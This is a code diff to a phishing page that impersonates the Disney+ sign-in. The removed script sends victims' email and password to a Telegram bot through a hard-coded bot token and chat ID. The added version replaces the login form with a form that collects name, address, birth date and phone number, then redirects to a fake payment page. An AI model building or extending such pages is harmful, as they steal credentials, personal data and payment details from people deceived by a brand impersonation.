@@ -3,31 +3,45 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Iniciar sesión | Disney+</title>
-  <!-- CSS commun (hero + formulaires) -->
+  <title>Información personal | Disney+</title>
+  <!-- CSS commun (landing + formulaires) -->
   <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
+        rel="stylesheet"/>
 </head>
 <body>
 
   <main class="main-content">
-    <!-- Logo centré au sommet de la carte -->
+    <!-- Logo centré -->
     <img src="Images/compose2.png"
          alt="Disney+"
-         style="display:block; margin:0 auto 16px; width:110px;"/>
+         style="display:block; margin:0 auto 30px; width:160px;"/>
 
-    <h1>Iniciar sesión</h1>
-    <p>Introduce tu usuario y contraseña para acceder a tu cuenta.</p>
+    <h1>Información personal</h1>
+    <p>Por favor completa tus datos antes de continuar.</p>
 
-    <form id="loginForm">
-      <input type="email" placeholder="Correo electrónico" required/>
-      <input type="password" placeholder="Contraseña" required/>
-      <button type="submit">Acceder</button>
+    <form id="infoForm">
+      <input type="text" placeholder="Apellido" required/>
+      <input type="text" placeholder="Nombre" required/>
+      <input type="text" placeholder="Dirección" required/>
+      <input type="text" placeholder="Ciudad" required/>
+      <input type="text" placeholder="Código postal" required/>
+      <select required>
+        <option value="" disabled selected>País</option>
+        <option value="ES">España</option>
+        <option value="FR">Francia</option>
+        <option value="BE">Bélgica</option>
+        <option value="CH">Suiza</option>
+      </select>
+      <input type="date" required/>
+      <input type="tel" placeholder="Teléfono" required/>
+      <button type="submit">Continuar</button>
     </form>
 
     <div class="footer-note">
       <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
-      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World
+      <a href="#">y más</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -46,27 +60,14 @@
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    document.getElementById("infoForm").addEventListener("submit", function(e) {
       e.preventDefault();
+      // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-
-      const email = this.querySelector('input[type="email"]').value.trim();
-      const pwd   = this.querySelector('input[type="password"]').value.trim();
-
-      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
-      const chatId   = "-4970333928";
-      const message  = `🔐 Inicio de sesión Disney+:\nUsuario: ${email}\nContraseña: ${pwd}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      }).catch(console.error)
-        .finally(() => {
-          setTimeout(() => {
-            window.location.href = "info.html";
-          }, 2500);
-        });
+      // Après 2,5s, redirige vers la page de paiement
+      setTimeout(() => {
+        window.location.href = "paiement.html";
+      }, 2500);
     });
   </script>
 </body>
